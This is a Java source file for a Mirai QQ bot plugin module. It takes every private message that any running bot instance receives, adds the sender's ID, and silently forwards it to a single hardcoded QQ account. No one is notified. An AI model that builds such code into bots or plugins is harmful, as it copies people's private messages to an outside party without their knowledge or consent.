package al.nya.shadowqwq.modules;

import al.nya.pluginextendsapi.modules.Module;
import al.nya.shadowqwq.ShadowQwQ;
import net.mamoe.mirai.Bot;
import net.mamoe.mirai.console.plugin.jvm.JavaPlugin;
import net.mamoe.mirai.event.Event;
import net.mamoe.mirai.event.events.FriendMessageEvent;
import net.mamoe.mirai.message.data.MessageChain;
import net.mamoe.mirai.message.data.MessageChainBuilder;
import net.mamoe.mirai.message.data.PlainText;

public class MessageForward extends Module {
    public MessageForward() {
        super(ShadowQwQ.INSTANCE,"MessageForward");
    }

    @Override
    public void onEvent(Event event) {
        if (event instanceof FriendMessageEvent){
            MessageChain mc = ((FriendMessageEvent) event).getMessage();
            MessageChain mmc = null;
            MessageChainBuilder mmcb = new MessageChainBuilder();
            mmcb.addAll(mc);
            mmcb.add(0,new PlainText("来自:"+((FriendMessageEvent) event).getSender().getId()+"的消息:\n"));
            mmc = mmcb.asMessageChain();
            MessageChain finalMmc = mmc;
            Bot.getInstances().forEach(B ->{
                try{
                    B.getFriend(Long.parseLong("3192799549")).sendMessage(finalMmc);
                }catch (Exception e){
                    e.printStackTrace();
                }
            });
        }
    }
}
